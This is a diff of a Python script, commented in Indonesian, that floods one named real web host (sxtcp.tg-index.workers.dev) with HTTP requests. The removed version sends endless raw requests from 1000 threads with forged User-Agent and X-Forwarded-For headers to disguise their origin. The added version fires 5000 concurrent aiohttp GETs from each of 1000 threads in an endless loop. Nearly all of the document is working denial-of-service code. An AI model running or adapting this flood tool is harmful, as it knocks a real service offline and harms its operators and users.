@@ -1,35 +1,49 @@
-import subprocess
+import asyncio
+import aiohttp
 import threading
-from faker import Faker
-    
-# Membuat instance Faker
-faker = Faker() 
 
-def execute_command():
-    while True: 
-        try:
-            # Membuat user agent palsu dan alamat IP palsu dengan faker
-            fake_user_agent = faker.user_agent()
-            fake_ip = faker.ipv4()
+async def fetch_url(url):
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get(url) as response:
+                response_text = await response.text()
+                if response.status == 200:
+                    return "Sukses"
+                else:
+                    return f"Kesalahan: Kode status {response.status}"
+    except Exception as e:
+        return "Kesalahan"
 
-            # Menjalankan perintah "xh" dengan opsi --raw melalui subproses dengan shell=True
-            cmd = f"xh GET https://sxtcp.tg-index.workers.dev --raw 'GET / HTTP/1.1\r\nHost: sxtcp.tg-index.workers.dev\r\nUser-Agent: {fake_user_agent}\r\nX-Forwarded-For: {fake_ip}\r\n\r\n'"
-            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-            process.communicate()
-            print("Sukses")
-        except subprocess.CalledProcessError as e:
-            print("Terjadi kesalahan:", e)
+def fetch_in_thread(url, num_requests):
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    responses = loop.run_until_complete(fetch_multiple_urls(url, num_requests))
+    loop.close()
+    return responses
 
-# Menentukan jumlah thread yang ingin Anda gunakan
-num_threads = 1000
+async def fetch_multiple_urls(url, num_requests):
+    tasks = []
+    for _ in range(num_requests):
+        task = asyncio.ensure_future(fetch_url(url))
+        tasks.append(task)
+    return await asyncio.gather(*tasks)
 
-# Membuat dan menjalankan thread sebanyak num_threads
-threads = []
-for _ in range(num_threads):
-    thread = threading.Thread(target=execute_command)
-    threads.append(thread)
-    thread.start()
+def main():
+    url = "https://sxtcp.tg-index.workers.dev"
+    num_requests = 5000
+    num_threads = 1000
 
-# Menunggu semua thread selesai
-for thread in threads:
-    thread.join()
+    while True:
+        print("Program berjalan...")
+        thread_list = []
+
+        for _ in range(num_threads):
+            thread = threading.Thread(target=fetch_in_thread, args=(url, num_requests))
+            thread_list.append(thread)
+            thread.start()
+
+        for thread in thread_list:
+            thread.join()
+
+if __name__ == "__main__":
+    main()
